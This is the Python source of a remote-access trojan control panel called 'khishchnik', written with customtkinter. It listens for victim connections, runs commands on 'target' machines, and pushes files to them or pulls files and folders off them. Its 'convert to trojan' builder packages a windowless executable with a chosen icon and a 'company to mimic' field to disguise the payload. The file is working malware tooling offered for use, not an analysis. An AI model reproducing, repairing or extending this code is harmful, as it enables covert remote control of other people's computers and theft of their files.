import tkinter
import tkinter.filedialog
import tkinter.messagebox
import customtkinter as ctk
import socket
import threading
import cv2 as cv
import select
import time
import os
import sys
import subprocess
import shutil
from PIL import Image
import signal



class EXE():
    def __init__(self):
        try:
            self.window=ctk.CTk()
            self.window.title("khishchnik")
            self.window.geometry('1000x600')
            self.window.resizable(False,False)
            self.c=0
            self.frames=[]
            self.omo_op=True
            self.got_size=0
            self.successful=True
            self.open_up=False   

            self.send_f=[]
            self.check_butt=[]
            new_p=cv.VideoCapture('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\The_Matrix.mp4')
            while self.omo_op:
                read,frame=new_p.read()
                if read:
                    frame=cv.cvtColor(frame,cv.COLOR_BGR2RGB)
                    self.frames.append(frame)
                else:
                    break

            #C:\\Users\\USER\\OneDrive\\Desktop\\top p\\image.png
            self.image= ctk.CTkImage(light_image=Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\image.png'),dark_image=Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\image.png'),size=(1000,600))
            self.photo_label=ctk.CTkLabel(self.window, text="", image=self.image)
            self.SOCKETS=[]
            self.name=[]
            self.ip="10.175.87.71"
            self.port=8080
            self.logo=False
            self.socket=socket.socket()
            self.socket.bind((self.ip,self.port))
            self.NUMBER_ON_Port=0
            self.connection=True
            self.pause=False
            self.complete=True
            self.recv_command=True
            self.exit=False
            self.val=None
            self.buttons_to_modify={}
            self.selected={}
            self.active_boxes={}
            self.continue_=True
        
            self.command_box=ctk.CTkTextbox(self.window,height=140,width=300,fg_color='black',text_color='green')
            self.first_scrollable =ctk.CTkScrollableFrame(self.window,height=307,width=280,fg_color='black')
            
            self.dropdown=ctk.CTkOptionMenu(self.window,values=['copy file','send file'],width=10,height=5,button_color='black',button_hover_color='black',fg_color='green',dropdown_fg_color='black',dropdown_hover_color='green',bg_color='green',command=self.get_button)
            self.dropdown.set('')

            self.entry=ctk.CTkEntry(self.window,width=70,border_color='green',fg_color='black')
            self.label_1=ctk.CTkLabel(self.window,text='NUMBER OF CONNECTED DEVICE(S) : ',text_color='green',fg_color='black')

            send_im=ctk.CTkImage(light_image=(Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\send.jpeg')),dark_image=(Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\send.jpeg')),size=(50,30))
            send_button_=ctk.CTkButton(self.window,image=send_im,text='',height=5,fg_color='black',width=5,hover_color='green',command=lambda x='l':self.send(x))
            exploit_img=ctk.CTkImage(light_image=(Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\exploit.jpeg')),dark_image=(Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\exploit.jpeg')),size=(40,25))
            exploit_button=ctk.CTkButton(self.window,height=7,text='EXPLOITS',text_color='red',fg_color='black',bg_color='black',corner_radius=40,image=exploit_img,hover=False,compound='right',state='disable')

            exploit_com=ctk.CTkButton(self.window,width=10,height=32,text_color='white',text='v',fg_color='black',corner_radius=0,compound='right',hover_color='green')


            value_=['add to existing image ','convert to trojan']
            self.gear_com=ctk.CTkComboBox(self.window,width=10,height=17,values=value_,fg_color='black',button_color='black',border_color='black',corner_radius=0,dropdown_fg_color='black',dropdown_text_color='white',dropdown_hover_color='green',command=self.build)
            self.gear_com.set('')

            gear_im=ctk.CTkImage(light_image=(Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\gear.jpeg')),dark_image=(Image.open('C:\\Users\\USER\\OneDrive\\Desktop\\top p\\gear.jpeg')),size=(50,15))
            gear__=ctk.CTkButton(self.window,image=gear_im,text='',height=10,fg_color='black',width=25,state='disable')


            self.photo_label.place(x=0,y=0)
            self.command_box.place(x=10,y=115)
            self.first_scrollable.place(x=10,y=260)
            self.dropdown.place(x=320,y=140)
            self.entry.place(x=820,y=8)
            self.label_1.place(x=580,y=8)
            send_button_.place(x=358,y=200)
            self.gear_com.place(x=942,y=11)
            exploit_button.place(x=10,y=15)
            gear__.place(x=895,y=10)

            exploit_com.place(x=140,y=15)

            self.message=''



            
            self.window.protocol('WM_DELETE_WINDOW',self.shieldo)
            self.window.bind('<Return>',self.send)
            threading.Thread(target=self.update_photo).start()
            threading.Thread(target=self.add_connection).start()
            threading.Thread(target=self.pinging).start()
            threading.Thread(target=self.update).start()
            threading.Thread(target=self.recieve_output).start()

            self.window.mainloop()
            x=os.getpid()
            os.kill(x,9)
        except Exception as e:
            print(e)
            pass

    def add_connection(self):
        while self.omo_op:
            try:
                self.socket.listen()
                self.x,self.y=self.socket.accept()
                if self.x not in self.SOCKETS :
                    #self.name.append(str(self.y[-1]))
                    self.name.append(socket.gethostbyaddr(self.y[0])[0])
                    self.SOCKETS.append(self.x)
                    self.NUMBER_ON_Port+=1
            except Exception as e:
                time.sleep(0.6)
        else:
            sys.exit(1)    

    def pinging(self):
        while self.omo_op:
            if not self.pause and len(self.SOCKETS)>0 :
                for i in self.SOCKETS:
                    try:
                        i.send("kokurokuu".encode())
                    except Exception as e:
                        message=f'{self.name[self.SOCKETS.index(i)]} DISCONNECTED'
                        self.error_entry.delete(0,len(self.error_entry.get()))
                        self.error_entry.insert(0,message)
                        if self.name[self.SOCKETS.index(i)] in self.selected.keys():
                            self.selected.pop(self.name[self.SOCKETS.index(i)])
                            self.first_tab.delete(self.name[self.SOCKETS.index(i)])
                            self.buttons_to_modify.pop(self.name[self.SOCKETS.index(i)])
                        self.name.remove(self.name[self.SOCKETS.index(i)])
                        self.SOCKETS.remove(i)
                        self.NUMBER_ON_Port-=1
            time.sleep(0.7)
        else:
            sys.exit(1)
   
    def update(self):
        self.first_scrollable =ctk.CTkScrollableFrame(self.window,height=307,width=280,fg_color='black')
        self.first_scrollable.place(x=10,y=260)
        self.first_tab=ctk.CTkTabview(self.window,width=400,height=470,corner_radius=30,segmented_button_fg_color='black',segmented_button_selected_color='green',segmented_button_unselected_color='red',segmented_button_unselected_hover_color='green',fg_color='black',bg_color='black',segmented_button_selected_hover_color='red',command=self.tab_)
        self.first_tab.place(x=520,y=115)
        self.error_entry=ctk.CTkEntry(self.first_tab,width=282,height=24,border_color='red',fg_color='black',text_color='red')
        self.label=ctk.CTkLabel(self.first_tab,fg_color='black',text='ERROR : ',text_color='red')
        self.label.place(x=36,y=439)
        self.error_entry.place(x=87,y=439)
        self.t=1
        while self.omo_op:
            try:
                if self.c <self.NUMBER_ON_Port :
                    self.button_=ctk.CTkButton(self.first_scrollable,corner_radius=30,fg_color='green',height=30,width=200,text_color='black',text='connected devices')
                    self.button_.grid(row=0,column=0,padx=16,pady=2)
                    try:
                        if self.name[self.c] not in self.selected.keys():
                            self.radio=ctk.CTkRadioButton(self.first_scrollable,width=5,height=5,radiobutton_height=10,radiobutton_width=10,hover_color='green',fg_color='red',border_color='red')
                            self.radio.configure(text=self.name[self.c],command= lambda v=self.name[self.c]:self.y_(v))
                        else:
                            self.radio=ctk.CTkRadioButton(self.first_scrollable,width=5,height=5,radiobutton_height=10,radiobutton_width=10,hover_color='red',fg_color='green',border_color='green')
                            self.radio.configure(text=self.name[self.c],command= lambda v=self.name[self.c]:self.y_(v))
                    
                        self.buttons_to_modify.update({self.name[self.c]:self.radio})
                        self.radio.grid(row=self.t,column=0,padx=3,pady=7,sticky='w')
                        self.t+=1
                        self.c+=1

                        self.entry.configure(state='normal',text_color='green')
                        self.entry.delete(0,len(self.entry.get()))
                        self.entry.insert(0,str(self.c))
                    except Exception as e:
                        pass

                elif self.c>self.NUMBER_ON_Port:
                    self.first_scrollable =ctk.CTkScrollableFrame(self.window,height=307,width=280,fg_color='black')
                    self.first_scrollable.place(x=10,y=260)
                    self.c=0
                    self.t=1
                    if  self.NUMBER_ON_Port>0 :
                        self.entry.configure(state='normal',text_color='green')
                        self.entry.delete(0,len(self.entry.get()))
                        self.entry.insert(0,str(self.NUMBER_ON_Port))
                    else:
                        self.entry.configure(state='normal',text_color='red')
                        self.entry.delete(0,len(self.entry.get()))
                        self.entry.insert(0,str(self.NUMBER_ON_Port))
            except Exception as e:
                pass
            time.sleep(0.5)
        else:
            sys.exit(1)
                
    def get_button(self,v):  
        self.dropdown.set("")
        if len(self.active_boxes)>0:
            self.pause=True
            #self.connection=False
            fra=self.first_tab.get()
            self.index_=self.name.index(fra)
            if v=='copy file':
                try:
                    self.new_win=ctk.CTkToplevel()
                    self.new_win.geometry('600x550')
                    self.scro=ctk.CTkScrollableFrame(self.new_win,width=550,height=500,fg_color='black')
                    self.send_button_=ctk.CTkButton(self.new_win,width=100,height=37,fg_color='black',text_color='green',text='TRANSFER')
                
                    self.scro.place(x=15,y=10)
                    self.send_button_.place(x=475,y=480)
                    
                    self.m=''
                    threading.Thread(target=self.do_stuff).start()
                    self.labelg=ctk.CTkLabel(self.scro,text=f'current directory {self.m}'.upper(),text_color='green',fg_color='black')
                    self.labelg.grid(row=0,column=0,padx=30)
                    self.new_win.mainloop()
                except Exception as e:
                    pass

            else:
                self.pause=True
                w=tkinter.messagebox.askquestion(title='confirm',message='ARE YOU SENDING A FOLDER ')
                if not w:
                    p=tkinter.filedialog.askopenfilename().strip()
                    if len(p)>0:
                        self.successful=False
                        time.sleep(1)
                        self.SOCKETS[self.index_].send('stop'.encode())
                        t=p.split('/')[-1]
                        t=t.split('.')[-1]
                        try:
                            file_size=os.path.getsize(p)
                            self.SOCKETS[self.index_].send('recievee__?'.encode())
                            time.sleep(0.8)
                            self.successful=True
                            self.SOCKETS[self.index_].send(str(file_size).encode())
                            d=ctk.CTkInputDialog(title='KISHISCHNIK',button_text_color='black',entry_fg_color='black',entry_text_color='green',text='what do you want the file to be save as on the target machine')
                            value=d.get_input()
                            self.successful=False
                            if len(value)>0:
                                value=value+"."+t
                                self.SOCKETS[self.index_].send(value.encode())
                                time.sleep(0.4)
                                with open( p,'rb') as file:
                                    self.SOCKETS[self.index_].sendfile(file)
                                time.sleep(0.7)
                                self.SOCKETS[self.index_].send('q'.encode())
                                self.successful=True
                                tkinter.messagebox.showinfo(message='FILE TRANSFER SUCESSFULL !')
                            else:
                                self.SOCKETS[self.index_].send('q'.encode())
                                self.successful=True
                        except Exception as e:
                            pass

                        except Exception as e:
                            tkinter.messagebox.showerror(message='FILE TRANSFER UNSUCESSFULL !')
                    else:
                        self.SOCKETS[self.index_].send('q'.encode())
                        self.successful=True
                else:
                    pn=tkinter.filedialog.askdirectory()
                    c_='C:\\temp'
                    if os.path.exists(c_):
                        shutil.rmtree(c_)
                    os.mkdir(c_)
                    rr=shutil.make_archive(pn,'zip',c_)
                    ww=os.path.getsize(rr)
                    ss=ctk.CTkInputDialog(fg_color='black',title='name',text='what do you want the target to see')
                    mok=ss.get_input()
                    if len(mok)>0:
                        #self.successful=False
                        #time.sleep(1)
                        self.SOCKETS[self.index_].send('stop'.encode())
                        time.sleep(0.5)
                        self.SOCKETS[self.index_].send('recievee__?'.encode())
                        time.sleep(0.7)
                        self.SOCKETS[self.index_].send(str(ww).encode())
                        time.sleep(0.6)
                        self.SOCKETS[self.index_].send(mok.encode())
                        time.sleep(0.5)
                        with open(rr,'rb') as fil:
                            self.SOCKETS[self.index_].sendfile(fil)
                        dd=''
                        while dd !='donezoo':
                            dd=self.SOCKETS[self.index_].recv(1024).decode()
                        self.SOCKETS[self.index_].send('q'.encode())
                        time.sleep(0.5)
                        self.pause=False
                    else:
                       tkinter.messagebox.showerror(title='ERROR',message='input name that target will see')


        else:
            tkinter.messagebox.showerror(message='Target must be selected !')
            


    def common(self):
        self.SOCKETS[self.index_].send('stop'.encode())
        time.sleep(0.8)
        self.SOCKETS[self.index_].send('ls'.encode())
        ww=self.SOCKETS[self.index_].recv(1024).decode()
        ww=ww.split(' ')[-1]
        output=''.join(ww)
        input=0
        mess=''
        while input<int(output):
            message=self.SOCKETS[self.index_].recv(1024).decode()
            mess+=message
            input+=len(message)
        self.SOCKETS[self.index_].send('q'.encode())
        mess=mess[1:-1]
        mess=mess.split(",")
        c=1
        for i in range(len(mess)):
            mess[i]=mess[i].split("'")[1]
        for i in range(len(mess)):
            x=ctk.CTkCheckBox(self.scro,text=mess[i],text_color='green',command=lambda x=mess[i]: self.check(x))
            if len(mess[i])<18:
                x.grid(row=c,column=0,padx=0,pady=5,sticky='w')
            else:
                x.grid(row=c,column=0,pady=5,sticky='w')
            self.check_butt.append(x)
            c+=1
            self.new_win.update()
       

#"C:\Users\USER\OneDrive\Desktop\meh\meh"

    def send(self,k):
        x=self.first_tab.get()
        self.val=x
        message=self.command_box.get('1.0','end').strip()
        if len(message)>0:
            if message =='cls' or message=='clear':
                cell=self.active_box.get(x)
                cell.delete('1.0','end')
                self.command_box.delete('1.0','end')
        
            else:
                if len(self.command_box.get('1.0','end').strip())>0:
                    if x in self.name:
                        self.p=self.name.index(x)
                        self.message=self.command_box.get('1.0','end').strip().strip()
                        try:
                            self.pause=True
                            time.sleep(0.4)
                            self.SOCKETS[self.p].send('stop'.encode())
                            time.sleep(0.6)
                            self.SOCKETS[self.p].send(self.message.encode())
                            self.command_box.delete("1.0",'end')
                            self.command_box.configure(state='disable')

                        except Exception as e:
                            self.pause=False

    def tab_(self):
        self.val=self.first_tab.get()
        self.error_entry.delete(0,len(self.error_entry.get()))
        if self.val not in self.active_boxes.keys():
            self.message_box=ctk.CTkTextbox(self.first_tab.tab(self.val),width=340,height=350,text_color='green',state='disable')
            self.message_box.place(x=4,y=5)
            self.active_boxes.update({self.val:self.message_box})
      
    def y_(self,v):
        try:
            if v not in self.selected.keys():
                self.ff=self.buttons_to_modify.get(v)
                self.ff.configure(border_color='green',fg_color='green')
                self.selected.update({v:'selected'})
                self.first_tab.add(v)
                self.tab_()
            else:
                self.ff=self.buttons_to_modify.get(v)
                self.ff.configure(border_color='red',fg_color='red')
        
                self.first_tab.delete(v)
                self.selected.pop(v)
                if v in  self.active_boxes.keys():
                    self.active_boxes.pop(v)
        except Exception as e:
            pass
        
    def recieve_output(self):
        while self.omo_op:
            if len(self.SOCKETS)>0 and self.connection:
                r,t,p=select.select(self.SOCKETS,[],[])
                if not self.successful:
                    self.SOCKETS[self.index_].send('q'.encode())
                    time.sleep(0.5)
                    self.successful=True
                if r:
                    for i in r:
                        try:
                            y=i.recv(1024).decode()
                            
                            if len(y)>0 and 'pinging' not in y:
                                
                                current_i=self.first_tab.get()

                                x=self.active_boxes.get(current_i)
                                x.configure(state='normal')
                                x.insert(str(len(x.get('1.0','end')))+'.0',f'output for {self.message.upper()}')
                                x.insert(str(len(x.get('1.0','end')))+'.0','\n')
                                x.insert(str(len(x.get('1.0','end')))+'.0','--------------------------------')
                                x.insert(str(len(x.get('1.0','end')))+'.0','\n') 
                                if 'command for ls' in y:
                                    size= y.split(' ')[-1]
                                    message=''
                                    current=0
                                    while current<int(size):
                                        d=i.recv(2000).decode()
                                        message+=d
                                        current+=len(d)
                                    
                                    messages=message.split(',')
                                    i.send('q'.encode())
                                    t=1
                                    for i in range(len(messages)):
                                        messages[i]=messages[i][2:-1]
                                    for i in messages:
                                        x.insert(str(len(x.get('1.0','end')))+'.0',f'{t}. {i}')
                                        x.insert(str(len(x.get('1.0','end')))+'.0','\n') 
                                        t+=1
                                    self.pause=False
                                elif 'sending_byte?' in y :
                                    self.new_win.destroy()
                                    subprocess.run('cls',shell=True)
                                    try:
                                        file_recieve=0
                                        global_path=self.m
                                        my_path=self.p
                                        for _ in range(len(self.send_f)):
                                            self.progress.set(0)
                                            path=global_path+'\\'+self.send_f[_].strip('/r')
                                            #remember nathan you can specify the target by using index
                                            self.SOCKETS[self.index_].send(path.encode())
                                            jj=self.SOCKETS[self.index_].recv(1024).decode()
                                            
                                            if 'sending__byte__file??' in jj:
                                                op=self.SOCKETS[self.index_].recv(1024).decode()
                                                file_save=0
                                                pp=my_path+'\\'+self.send_f[_]
                                                with open(pp,'wb') as fool:
                                                    while  file_save<int(op):

                                                        file=self.SOCKETS[self.index_].recv(1024)
                                                        fool.write(file)
                                                        file_save+=len(file)
                                                        percentage=int((file_save/int(op))*100)
                                                        percentage=str(percentage*0.01)[0:4]
                                                        self.label2.configure(text=str(int(float(percentage)*100))+" %",text_color='green')
                                                        self.progress.set(float(percentage))
                                                        self.k.update()
                                            
                                            elif 'sending?directory?__' in jj:
                                                try:
                                                    p=''
                                                    for ab in my_path:
                                                        if ab =="/":
                                                            p+="\\"
                                                        else:
                                                            p+=ab
                                                    path=p+'\\'+self.send_f[_]
                                                    if os.path.exists(path):
                                                        shutil.rmtree(path)
                                                        os.makedirs(path)
                                                    else:
                                                        os.makedirs(path)
                                                    over_all_size=self.SELECT[self.index_].recv(1024).decode()
                                                    ll=0
                                                    path_a ='C:\\dark side tem_f'
                                                    if os.path.exists(path_a):
                                                        shutil.rmtree(path_a)
                                                        #"C:\dark side tem_f\temp"
                                                    os.mkdir(path_a)
                                                    with open(path_a+'\\temp.zip','wb') as file__:
                                                        while ll <int(over_all_size):
                                                            qq=self.SOCKETS[self.index_].recv(1024)
                                                            file__.write(qq)
                                                            ll+=len(qq)
                                                            percentage=int((ll/int(over_all_size))*100)
                                                            percentage=str(percentage*0.01)[0:4]
                                                            self.label2.configure(text=str(int(float(percentage)*100))+" %",text_color='green')
                                                            self.progress.set(float(percentage))
                                                            self.k.update()
                                                    shutil.unpack_archive(path_a+'\\temp.zip',path)
                                                    self.SOCKETS[self.index_].send('oboxxx'.encode())
                                                    shutil.rmtree(path_a+'\\temp.zip')
                                                        
                                                except Exception as e:
                                                    pass
                                            self.label3.configure(text=f'{_+1}/{len(self.send_f)}')
                                        tkinter.messagebox.showinfo(message='FILE TRANSFER COMPLETED')
                                        self.k.destroy()
                                        self.successful=True
                                        self.SOCKETS[self.index_].send('oblagogo'.encode())
                                        time.sleep(0.5)
                                        self.SOCKETS[self.index_].send('q'.encode())
                                        self.pause=True
                                    except Exception as e:
                                        pass




                                else:
                                    size=int(y)
                                    j=0
                                    message=''
                                    while j<size:
                                        f=i.recv(2000).decode()
                                        message+=f
                                        j+=len(f)
                                    i.send('q'.encode())
                                    if 'ERROR' in message:
                                        self.error_entry.delete(0,len(self.error_entry.get()))
                                        self.error_entry.insert(0,message[7:])
                                        tkinter.messagebox.showinfo(message=f'target got( {self.message} ) as command check command and try again')
                                    else:
                                        self.error_entry.delete(0,len(self.error_entry.get()))
                                        x.insert(str(len(x.get('1.0','end')))+'.0',message)
                                        x.insert(str(len(x.get('1.0','end')))+'.0','\n') 
                                x.insert(str(len(x.get('1.0','end')))+'.0','--------------------------------')
                                x.insert(str(len(x.get('1.0','end')))+'.0','\n') 
                                x.configure(state='disable')
                        except Exception as e:
                            pass
            self.command_box.configure(state='normal')
            time.sleep(0.6)
        else:
            sys.exit(1)

    def update_photo(self):
        while self.omo_op:
            for i in range(len(self.frames)):
                new_f=Image.fromarray(self.frames[i])
                new_img=ctk.CTkImage(light_image=(new_f),dark_image=(new_f),size=(1000,600))
                self.photo_label.configure(image=new_img)
                time.sleep(0.047)
        else:
            sys.exit(1)
    
    def get_f(self):
        try:
            self.pause=True
            #self.connection=True
            l=''
            self.p=tkinter.filedialog.askdirectory().strip()
            j=''
            for i in self.p:
                if i=="/" or i =="\\":
                    j+=i
                else:
                    j+=i
            self.p=j
            self.SOCKETS[self.index_].send('stop'.encode())
            
            self.SOCKETS[self.index_].send('cd'.encode())

            me=self.SOCKETS[self.index_].recv(1024).decode()
            self.path_message=''
            input=0
            while input<(int(me)):
                x=self.SOCKETS[self.index_].recv(1024).decode()
                self.path_message+=x
                input+=len(x)
            self.SOCKETS[self.index_].send('q'.encode())
            self.k=ctk.CTkToplevel(self.window,fg_color='black')
            self.k.geometry('500x100')
            label=ctk.CTkLabel(self.k,text='Starting Download.......',fg_color='black',text_color='green')
            self.label2=ctk.CTkLabel(self.k,text='0%',fg_color='black',text_color='red',height=40)
            self.label3=ctk.CTkLabel(self.k,text=f'1/{len(self.send_f)}',fg_color='black',text_color='red',height=40)
            self.progress=ctk.CTkProgressBar(self.k,width=300,height=10,fg_color='red',corner_radius=0,progress_color='green',determinate_speed=0.5)
            self.progress.set(0)
            label.place(x=50,y=17)
            self.label3.place(x=10,y=25)
            self.label2.place(x=380,y=25)
            self.progress.place(x=50,y=40)    
            self.connection=True

            self.SOCKETS[self.index_].send('stop'.encode())
            time.sleep(0.6)
            self.SOCKETS[self.index_].send('send_me__??'.encode())
    

            self.k.mainloop()
        except Exception as e:
            pass
        
    def build(self,v):
        x=self.gear_com.get()
        self.gear_com.set('')
        try:
            if x=='convert to trojan':
                if not self.open_up:
                    self.dd=ctk.CTkToplevel(self.window,fg_color='black')
                    self.open_up=True
                    self.dd.resizable(False,False)
                    #self.dd=ctk.CTkToplevel(self.window,fg_color='black')
                    self.dd.title('detail')
                    self.dd.geometry('300x300')
                    self.kk=''
                    self.min_label=ctk.CTkLabel(self.dd,text='Name',text_color='red',fg_color='black')
                    self.min_entry1=ctk.CTkEntry(self.dd,placeholder_text='enter name',placeholder_text_color='red',fg_color='black',border_color='green',text_color='green')

                    self.min_label2=ctk.CTkLabel(self.dd,text='image',text_color='red',fg_color='black')
                    self.min_entry2=ctk.CTkEntry(self.dd,placeholder_text='enter path',placeholder_text_color='red',fg_color='black',border_color='green',text_color='green')
                    val=['files']
                    self.min_combo=ctk.CTkComboBox(self.dd,width=7,height=24,corner_radius=0,fg_color='black',values=val,border_color='black',command=self.get,button_hover_color='green',bg_color='green',button_color='green')
                    self.min_combo.set('')

                    self.min_label3=ctk.CTkLabel(self.dd,text='version',text_color='red',fg_color='black')
                    self.min_entry3=ctk.CTkEntry(self.dd,placeholder_text='version',placeholder_text_color='red',fg_color='black',border_color='green',text_color='green')


                    self.min_label4=ctk.CTkLabel(self.dd,text='author',text_color='red',fg_color='black')
                    self.min_entry4=ctk.CTkEntry(self.dd,placeholder_text='company to mimic',placeholder_text_color='red',fg_color='black',border_color='green',text_color='green')

                    send=ctk.CTkButton(self.dd,width=150,height=35,corner_radius=30,text='Build',fg_color='green',text_color='black',hover_color='green',command=self.build__)

                    self.min_label.place(x=5,y=7)
                    self.min_entry1.place(x=49,y=7)

                    self.min_label2.place(x=5,y=37)
                    self.min_combo.place(x=179,y=39)
                    self.min_entry2.place(x=49,y=37)
                    

                    self.min_label3.place(x=5,y=67)
                    self.min_entry3.place(x=49,y=67)

                    self.min_label4.place(x=5,y=97)
                    self.min_entry4.place(x=49,y=97)
                    send.place(x=75,y=150)
                    self.dd.mainloop()
                else:
                    self.dd.destroy()
                    self.open_up=False
        except Exception as e:
            pass


    def get(self,v):
        self.min_combo.set('')
        ll=tkinter.filedialog.askopenfile()
        ll=ll.name
        if ll.endswith('png') or ll.endswith('ico') or ll.endswith('jpeg') or ll.endswith('jpg'):
            self.min_entry2.delete(0,len(self.min_entry2.get()))
            self.min_entry2.insert(0,ll)
            self.min_entry2.configure(state='disable')
        else:
            tkinter.messagebox.showerror('Invalid image format !')


    def build__(self):
        que=tkinter.messagebox.askyesno(message='Are you sure about the information')
        if que:
            try:
                self.name_c=self.min_entry1.get()
                self.img_c=self.min_entry2.get()
                self.dd.destroy()
                self.k_=ctk.CTkToplevel(self.window,fg_color='black')
                self.k_.geometry('500x100')
                self.k_.resizable(False,False)
                label_=ctk.CTkLabel(self.k_,text='creating trojan.......',fg_color='black',text_color='green')
                self.progress_=ctk.CTkProgressBar(self.k_,width=300,height=10,fg_color='red',corner_radius=0,progress_color='green',orientation='indeterminate',indeterminate_speed=0.8,)
                threading.Thread(target=self.should_work).start()
                label_.place(x=40,y=17)
                self.progress_.place(x=40,y=40) 
                self.k_.mainloop()
            except Exception as e:
                pass

    def should_work(self):
        threading.Thread(target=self.start_stop).start()
        if len(self.name_c)>0:
            pass
        else:
            self.name_c='TROJAN'
        path='C:\\Dark side'
        try:
            if os.path.exists(path):
                shutil.rmtree(path)
            else:
                os.mkdir(path)
            if getattr(sys,'frozen',False):
                new_path=os.path.join(sys._MEIPASS,'meh')
                if os.path.exists(new_path):
                    shutil.copytree(new_path,path)
                else:
                    tkinter.messagebox.showerror(message='ERROR WHILE GETTING NECESSARY FILES !')
            if getattr(sys,'frozen',False):
                file_path=os.path.join(sys._MEIPASS,'khishchnik.py')
                if os.path.exists(file_path):
                    shutil.copy(file_path,path)
                else:
                    tkinter.messagebox.showerror(message='ERROR WHILE GETTING TROJON PATH !')
                    exit
            if os.path.exists(self.img_c):
                shutil.copy(self.img_c,path)
            else:
                tkinter.messagebox.showerror(message='ERROR WHILE GETTING IMAGE FILES !')

            current=os.getcwd()
            os.chdir(path)
            pyinstaller=path+'\\PyInstaller'
            python=path+'\\python.exe'
            if os.path.exists(pyinstaller) and os.path.exists(python):
                try:
                    tkinter.messagebox.showinfo(message='CHOSSE PATH TO SAVE APP !')
                    dist_path=tkinter.filedialog.askdirectory()
                    g_=''
                    for i in dist_path:
                        if i=='/':
                            g_+='\\'
                        else:
                            g_+=i
                    dist_path=g_

                    u=''


                    u=str(self.img_c).split('/')[-1]
                    image=path+'\\'+u
                    command=['python','-m','PyInstaller','-F','-w','--clean',f'-n {self.name_c}',f'--icon={image}',f'--distpath',dist_path,'khishchnik.py']
                    x=subprocess.run(command,stdout=subprocess.PIPE,shell=True)
                    if x.returncode==0:
                        tkinter.messagebox.showinfo(message=f'{self.name_c} created sucessfully!') 
                    else:
                        tkinter.messagebox.showinfo(message=f'{self.name_c} created sucessfully!')

                    self.progress_.stop()
                    self.k_.destroy()
                    os.chdir(current)
                    shutil.rmtree(path)

                except Exception as e:
                    pass
                    

            else:
                tkinter.messagebox.showerror(message=f'ERROR WHILE GETTING NECESSARY PATH !')
        except Exception as e:
            pass
            

    def check(self,x):
        if x not in self.send_f:
            self.send_f.append(x)
        else:
            self.send_f.remove(x)
        self.pause=False
        self.successful=True
        if len(self.send_f)>0:
            self.send_button_.configure(command=self.get_f)
        else:
            self.send_button_.configure(command=None)

    def shieldo(self):
        self.omo_op=False
        self.window.destroy()


    def start_stop(self):
        self.progress_.start()

    def do_stuff(self):
        self.SOCKETS[self.index_].send('stop'.encode())
        time.sleep(0.8)
        self.SOCKETS[self.index_].send('cd'.encode())
        ww=self.SOCKETS[self.index_].recv(1024).decode()

        power=0

        while power<int(ww):
            message=self.SOCKETS[self.index_].recv(1024).decode()
            self.m+=message
            power+=len(message)
        self.labelg.configure(text=f'current directory {self.m}'.upper())
        self.SOCKETS[self.index_].send('q'.encode())
        self.successful=True
        threading.Thread(target=self.common).start()

EXE() 